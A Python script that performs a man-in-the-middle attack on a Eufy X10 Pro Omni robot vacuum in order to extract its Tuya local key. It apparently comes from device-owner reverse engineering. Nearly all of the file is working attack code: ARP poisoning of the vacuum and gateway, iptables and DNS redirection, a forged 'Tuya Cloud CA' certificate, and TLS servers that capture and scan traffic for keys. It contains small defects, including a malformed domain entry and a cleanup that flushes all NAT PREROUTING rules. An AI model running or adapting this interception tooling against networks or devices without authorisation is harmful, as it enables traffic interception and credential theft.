#!/usr/bin/env python3
"""
MITM attack on Eufy X10 Pro Omni vacuum.

1. ARP spoof to intercept vacuum's traffic
2. DNS redirect Tuya cloud domains to our fake server
3. TLS server that accepts vacuum connections
4. Capture everything the vacuum sends during boot/reconnect

Run as root. User must power-cycle the vacuum after this starts.
"""

import json
import os
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
from datetime import datetime

VACUUM_IP = "192.168.1.XXX"
GATEWAY_IP = "192.168.1.1"
OUR_IP = "192.168.1.YYY"
INTERFACE = "eth0"

TUYA_DOMAINS = [
    "a1.tuyaeu.com",
    "a2.tuyaeu.com",
    "a1.tuyaus.com",
    "a2.tuyaus.com",
    "a1.tuyacn.com",
    "a2.tuyacn.com",
    "m1.tuyaeu.com",
    "m2.tuyaeu.com",
    "m1.tuyaus.com",
    "m2.tuyaus.com",
    "m1.tuyacn.com",
    "m2.tuyacn.com",
    "a.]tuyaeu.com",
    "a.tuyaus.com",
    "mqtt.tuyaeu.com",
    "mqtt.tuyaus.com",
    "mqtt-eu.tuyaeu.com",
    "mqtt-us.tuyaus.com",
]

LOG_DIR = "/tmp/mitm_captures"
os.makedirs(LOG_DIR, exist_ok=True)


def log(msg):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"[{ts}] {msg}")


def generate_certs():
    log("Generating fake TLS certificates...")
    ca_key = os.path.join(LOG_DIR, "ca.key")
    ca_cert = os.path.join(LOG_DIR, "ca.crt")
    srv_key = os.path.join(LOG_DIR, "server.key")
    srv_cert = os.path.join(LOG_DIR, "server.crt")

    if not os.path.exists(ca_cert):
        subprocess.run(
            [
                "openssl",
                "req",
                "-x509",
                "-newkey",
                "rsa:2048",
                "-keyout",
                ca_key,
                "-out",
                ca_cert,
                "-days",
                "365",
                "-nodes",
                "-subj",
                "/CN=Tuya Cloud CA/O=Tuya Inc",
            ],
            capture_output=True,
        )

    san_conf = os.path.join(LOG_DIR, "san.cnf")
    san_names = "\n".join(f"DNS.{i+1} = {d}" for i, d in enumerate(TUYA_DOMAINS))
    san_names += f"\nDNS.{len(TUYA_DOMAINS)+1} = *.tuyaeu.com"
    san_names += f"\nDNS.{len(TUYA_DOMAINS)+2} = *.tuyaus.com"
    san_names += f"\nDNS.{len(TUYA_DOMAINS)+3} = *.tuyacn.com"
    san_names += f"\nIP.1 = {OUR_IP}"

    with open(san_conf, "w") as f:
        f.write(f"""[req]
distinguished_name = req_dn
req_extensions = v3_req
[req_dn]
CN = a1.tuyaeu.com
[v3_req]
subjectAltName = @alt_names
[alt_names]
{san_names}
""")

    subprocess.run(
        [
            "openssl",
            "req",
            "-newkey",
            "rsa:2048",
            "-nodes",
            "-keyout",
            srv_key,
            "-out",
            os.path.join(LOG_DIR, "server.csr"),
            "-subj",
            "/CN=a1.tuyaeu.com/O=Tuya Inc",
            "-config",
            san_conf,
        ],
        capture_output=True,
    )

    subprocess.run(
        [
            "openssl",
            "x509",
            "-req",
            "-in",
            os.path.join(LOG_DIR, "server.csr"),
            "-CA",
            ca_cert,
            "-CAkey",
            ca_key,
            "-CAcreateserial",
            "-out",
            srv_cert,
            "-days",
            "365",
            "-extensions",
            "v3_req",
            "-extfile",
            san_conf,
        ],
        capture_output=True,
    )

    log(f"Certs generated: {srv_cert}")
    return srv_key, srv_cert


def start_arp_spoof():
    log("Starting ARP spoof (become gateway for vacuum)...")
    from scapy.all import ARP, Ether, getmacbyip, sendp

    vacuum_mac = getmacbyip(VACUUM_IP)
    gateway_mac = getmacbyip(GATEWAY_IP)
    our_mac = Ether().src

    if not vacuum_mac:
        log(f"ERROR: Cannot find MAC for {VACUUM_IP}")
        return

    log(f"Vacuum MAC: {vacuum_mac}")
    log(f"Gateway MAC: {gateway_mac}")
    log(f"Our MAC: {our_mac}")

    # Enable IP forwarding
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    log("IP forwarding enabled")

    # ARP poison: tell vacuum WE are the gateway
    pkt_to_vacuum = Ether(dst=vacuum_mac) / ARP(
        op=2, psrc=GATEWAY_IP, pdst=VACUUM_IP, hwdst=vacuum_mac
    )
    # ARP poison: tell gateway WE are the vacuum
    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
        op=2, psrc=VACUUM_IP, pdst=GATEWAY_IP, hwdst=gateway_mac
    )

    def spoof_loop():
        while True:
            sendp(pkt_to_vacuum, iface=INTERFACE, verbose=False)
            sendp(pkt_to_gateway, iface=INTERFACE, verbose=False)
            time.sleep(2)

    t = threading.Thread(target=spoof_loop, daemon=True)
    t.start()
    log("ARP spoof running (sending every 2s)")
    return t


def start_dns_redirect():
    log("Starting DNS redirect for Tuya domains...")

    dnsmasq_conf = os.path.join(LOG_DIR, "dnsmasq.conf")
    with open(dnsmasq_conf, "w") as f:
        f.write(f"listen-address={OUR_IP}\n")
        f.write(f"bind-interfaces\n")
        f.write(f"port=53\n")
        f.write(f"no-resolv\n")
        f.write(f"server=8.8.8.8\n")
        for domain in TUYA_DOMAINS:
            f.write(f"address=/{domain}/{OUR_IP}\n")
        f.write(f"address=/tuyaeu.com/{OUR_IP}\n")
        f.write(f"address=/tuyaus.com/{OUR_IP}\n")
        f.write(f"address=/tuyacn.com/{OUR_IP}\n")
        f.write(f"address=/eufylife.com/{OUR_IP}\n")

    # Kill existing dnsmasq
    subprocess.run(["pkill", "-f", "dnsmasq.*mitm"], capture_output=True)
    time.sleep(1)

    proc = subprocess.Popen(
        ["dnsmasq", "-C", dnsmasq_conf, "--no-daemon", "--log-queries"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    log(f"dnsmasq running (PID {proc.pid})")

    # Redirect vacuum's DNS to us via iptables
    subprocess.run(
        [
            "iptables",
            "-t",
            "nat",
            "-A",
            "PREROUTING",
            "-s",
            VACUUM_IP,
            "-p",
            "udp",
            "--dport",
            "53",
            "-j",
            "DNAT",
            "--to-destination",
            f"{OUR_IP}:53",
        ],
        capture_output=True,
    )
    log("DNS iptables redirect set")

    return proc


def start_tls_servers(srv_key, srv_cert):
    log("Starting fake TLS servers on common Tuya ports...")

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(srv_cert, srv_key)
    ctx.set_ciphers("DEFAULT:@SECLEVEL=0")

    servers = []
    for port in [443, 8883, 1883, 6668, 9668, 80]:
        try:
            t = threading.Thread(target=run_tls_server, args=(ctx, port), daemon=True)
            t.start()
            servers.append(t)
            log(f"  TLS server on port {port}")
        except Exception as e:
            log(f"  Port {port} failed: {e}")

    return servers


def run_tls_server(ctx, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("0.0.0.0", port))
    except OSError as e:
        log(f"  Cannot bind port {port}: {e}")
        return
    sock.listen(5)

    while True:
        try:
            client, addr = sock.accept()
            log(f"  📨 CONNECTION on port {port} from {addr}")

            # Try TLS upgrade
            try:
                tls_client = ctx.wrap_socket(client, server_side=True)
                log(f"  🔒 TLS handshake OK on port {port} from {addr}")
                log(f"     Cipher: {tls_client.cipher()}")

                # Read whatever the client sends
                data = b""
                tls_client.settimeout(10)
                try:
                    while True:
                        chunk = tls_client.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if len(data) > 65536:
                            break
                except TimeoutError:
                    pass

                if data:
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    capture_file = os.path.join(LOG_DIR, f"tls_{port}_{ts}.bin")
                    with open(capture_file, "wb") as f:
                        f.write(data)

                    log(f"  📦 Captured {len(data)} bytes on port {port}")
                    log(f"     Hex: {data[:64].hex()}")
                    log(f"     Saved: {capture_file}")

                    analyze_capture(data, port)

                tls_client.close()

            except ssl.SSLError as e:
                log(f"  ⚠️ TLS failed on port {port}: {e}")
                # Still capture raw data
                client.settimeout(5)
                try:
                    raw = client.recv(4096)
                    if raw:
                        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                        with open(
                            os.path.join(LOG_DIR, f"raw_{port}_{ts}.bin"), "wb"
                        ) as f:
                            f.write(raw)
                        log(f"  📦 Raw capture {len(raw)} bytes: {raw[:64].hex()}")
                except:
                    pass
                client.close()

        except Exception as e:
            log(f"  Error on port {port}: {e}")


def also_run_plain_tcp_servers():
    for port in [443, 8883, 1883, 6668, 9668, 80, 7000, 9667]:
        try:
            t = threading.Thread(target=run_plain_tcp_server, args=(port,), daemon=True)
            t.start()
        except:
            pass


def run_plain_tcp_server(port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", port))
        sock.listen(5)
    except:
        return

    while True:
        try:
            client, addr = sock.accept()
            log(f"  📨 PLAIN TCP on port {port} from {addr}")
            client.settimeout(10)
            data = client.recv(8192)
            if data:
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                with open(os.path.join(LOG_DIR, f"plain_{port}_{ts}.bin"), "wb") as f:
                    f.write(data)
                log(f"  📦 Plain capture: {len(data)} bytes: {data[:64].hex()}")
                analyze_capture(data, port)
            client.close()
        except:
            pass


def analyze_capture(data, port):
    data_str = data.decode("ascii", errors="replace")

    # Look for JSON with localKey
    if "localKey" in data_str or "local_key" in data_str:
        log(f"  🔑🔑🔑 LOCAL KEY FOUND IN CAPTURE! Port {port}")
        log(f"  Data: {data_str[:500]}")

    # Look for device registration/auth data
    if "devId" in data_str or "ANON_DEVICE_ID_001" in data_str:
        log(f"  🎯 Device ID found in capture! Port {port}")
        log(f"  Data: {data_str[:500]}")

    # Look for MQTT CONNECT packet (starts with 0x10)
    if data[0:1] == b"\x10":
        log(f"  📡 MQTT CONNECT packet detected on port {port}!")
        log(f"  Full hex: {data[:256].hex()}")

    # Look for protobuf messages
    if data[0:1] in (b"\x08", b"\x0a", b"\x12", b"\x1a"):
        log(f"  📋 Possible protobuf on port {port}")

    # Look for Tuya protocol headers (0x000055aa)
    if b"\x00\x00\x55\xaa" in data:
        log(f"  ⚡ Tuya protocol header found on port {port}!")
        log(f"  Data: {data[:256].hex()}")

    # Look for any 16-char alphanumeric strings (potential keys)
    import re

    keys = re.findall(rb"[a-zA-Z0-9]{16}", data)
    if keys:
        unique = list({k.decode() for k in keys})
        log(f"  🔍 16-char strings found: {unique[:10]}")


def main():
    print("=" * 60)
    print("  EUFY X10 PRO OMNI — MITM KEY EXTRACTION")
    print("=" * 60)
    print(f"  Vacuum:  {VACUUM_IP}")
    print(f"  Gateway: {GATEWAY_IP}")
    print(f"  Us:      {OUR_IP}")
    print(f"  Capture: {LOG_DIR}/")
    print("=" * 60)
    print()

    # Step 1: Generate fake certs
    srv_key, srv_cert = generate_certs()

    # Step 2: ARP spoof
    start_arp_spoof()
    time.sleep(3)

    # Step 3: DNS redirect (not using dnsmasq — using iptables NAT instead)
    # For DNS, redirect vacuum's DNS queries to our dnsmasq
    # Actually let's skip dnsmasq and just use iptables to redirect ALL vacuum traffic to us

    # Redirect ALL TCP from vacuum to us (transparent proxy)
    for port in [443, 8883, 1883]:
        subprocess.run(
            [
                "iptables",
                "-t",
                "nat",
                "-A",
                "PREROUTING",
                "-s",
                VACUUM_IP,
                "-p",
                "tcp",
                "--dport",
                str(port),
                "-j",
                "REDIRECT",
                "--to-port",
                str(port),
            ],
            capture_output=True,
        )
    log("iptables TCP redirect set for ports 443, 8883, 1883")

    # Step 4: Start TLS servers
    start_tls_servers(srv_key, srv_cert)

    print()
    print("=" * 60)
    print("  ⚡ MITM IS ACTIVE")
    print("  ⚡ NOW POWER-CYCLE YOUR VACUUM (unplug and replug)")
    print("  ⚡ Watching for connections...")
    print("=" * 60)
    print()

    # Also start tcpdump for full capture
    tcpdump = subprocess.Popen(
        [
            "tcpdump",
            "-i",
            INTERFACE,
            f"host {VACUUM_IP}",
            "-w",
            os.path.join(LOG_DIR, "full_capture.pcap"),
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log("Shutting down...")
        # Cleanup iptables
        subprocess.run(
            ["iptables", "-t", "nat", "-F", "PREROUTING"], capture_output=True
        )
        # Restore ARP
        subprocess.run(["pkill", "-f", "dnsmasq"], capture_output=True)
        tcpdump.terminate()
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        log("Cleaned up. Done.")


if __name__ == "__main__":
    main()
